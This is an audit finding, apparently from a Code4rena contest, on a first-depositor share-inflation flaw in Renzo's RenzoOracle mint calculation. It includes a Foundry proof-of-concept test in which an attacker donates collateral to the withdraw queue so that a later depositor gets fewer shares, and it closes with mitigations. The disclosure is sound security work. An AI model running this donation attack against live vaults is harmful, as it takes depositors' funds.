# Vulnerability details

## Impact
The [`RenzoOracle`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Oracle/RenzoOracle.sol) contract is responsible for calculating the amount of `ezETH` tokens to mint when users deposit collateral into the protocol. It does this in the [`calculateMintAmount()`](https://github.com/code-423n4/2024-04-renzo/blob/519e518f2d8dec9acf6482b84a181e403070d22d/contracts/Oracle/RenzoOracle.sol#L123) function, which determines the inflation percentage based on the ratio of new value being added to the total value locked in the protocol.

However, there is a vulnerability in this calculation that allows the first depositor to artificially inflate the value of their `ezETH` shares by donating a large amount of collateral to the withdraw queue. 

The root cause is that the `calculateMintAmount()` function calculates the inflation percentage as:

```solidity
inflationPercentaage = (SCALE_FACTOR * _newValueAdded) / (_currentValueInProtocol + _newValueAdded);
```

This means that if the `_currentValueInProtocol` is very small (e.g. 1 wei) and a large `_newValueAdded` is donated to the withdraw queue, the `inflationPercentage` will be very close to 100%. This inflated percentage is then used to calculate the new total supply of `ezETH`.

As a result, the first depositor can deposit a tiny amount to mint 1 wei worth of `ezETH`, then donate a large amount (e.g. 10e18) to the withdraw queue. This will cause future mints to be rounded down to the nearest 10e18 multiple, with the excess value being distributed to existing `ezETH` holders - benefitting the attacker, who holds an inflated share of the total supply.

It is worth noting that, while this vulnerability will not apply to the planned upgrade of the deployed live contracts, we believe it to be valid in the context of this contest as it is clearly present in the contracts in scope.

## Proof of Concept
We can validate the vulnerability through a Foundry test case POC. This test case will simulate the exploit scenario and confirm the issue by performing the following actions:
1. Have Alice (attacker) deposit 2 wei of `cbETH` to mint 2 wei of `ezETH`  
2. Have Alice donate 20e18 `cbETH` to the withdraw queue, inflating the value of her `ezETH`
3. Have Bob deposit 19.999e18 `cbETH` 
4. Confirm that Alice has 2 `ezETH` and Bob only has 1 `ezETH`, despite depositing almost the same value

The PoC can be run in Foundry by using the setup and mock infra provided here -> https://gist.github.com/3docSec/a4bc6254f709a6218907a3de370ae84e

```solidity
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./Setup.sol";

contract H5 is Setup {

    function testH5() public {
        // easy setup
        stEthPriceOracle.setAnswer(1e18);
        cbEthPriceOracle.setAnswer(1e18);
        
        // we reset the buffer to circumvent an unrelated bug
        WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](2);

        buffers[0] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(stETH), 1);
        buffers[1] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(cbETH), 1);

        vm.startPrank(OWNER);
        withdrawQueue.updateWithdrawBufferTarget(buffers);

        // we start with 0 tvl
        (, , uint tvl) = restakeManager.calculateTVLs();
        assertEq(0, tvl);

        // Alice deposits wei's
        address alice = address(1234567890);
        cbETH.mint(alice, 2);
        vm.startPrank(alice);
        cbETH.approve(address(restakeManager), 2);
        restakeManager.deposit(IERC20(address(cbETH)), 2);

        // then Alice inflates the value of their ezETH shares
        cbETH.mint(alice, 20e18);
        cbETH.transfer(address(withdrawQueue), 20e18);

        // Bob comes in with almost as much liquidity as Alice
        address bob = address(1234567891);
        cbETH.mint(bob, 19.999e18);
        vm.startPrank(bob);
        cbETH.approve(address(restakeManager), 19.999e18);
        restakeManager.deposit(IERC20(address(cbETH)), 19.999e18);

        // however, Alice has double the shares of Bob.
        // Lucky Alice, poor Bob.
        assertEq(2, ezETH.balanceOf(alice));
        assertEq(1, ezETH.balanceOf(bob));
    }
}
```

## Recommended Mitigation Steps
There are multiple ways of solving the issue:
1. Add a minimum output check to ensure the amount of minted shares is as the depositor expects.
2. Track asset balances internally so an attacker cannot donate assets to inflate shares.
3. Mint an initial number of "dead shares", similar to how UniswapV2 does.
